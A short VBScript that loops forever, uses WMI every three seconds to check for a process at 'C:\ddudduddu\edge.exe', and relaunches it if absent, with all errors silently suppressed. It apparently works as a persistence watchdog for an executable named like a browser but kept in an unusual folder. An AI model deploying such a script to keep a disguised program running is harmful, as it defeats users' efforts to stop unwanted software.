On Error Resume Next
Set sh = CreateObject("WScript.Shell")
Set wmi = Nothing
Do
  If wmi Is Nothing Then
    Set wmi = GetObject("winmgmts:\\.\root\cimv2")
  End If
  If Not (wmi Is Nothing) And Err.Number = 0 Then
    Set procs = wmi.ExecQuery("SELECT ProcessId FROM Win32_Process WHERE ExecutablePath = 'C:\\ddudduddu\\edge.exe'")
    If Err.Number = 0 Then
      If procs.Count = 0 Then
        sh.Run """C:\ddudduddu\edge.exe""", 1, False
      End If
    Else
      Err.Clear
      Set wmi = Nothing
    End If
  Else
    Err.Clear
    Set wmi = Nothing
  End If
  WScript.Sleep 3000
Loop
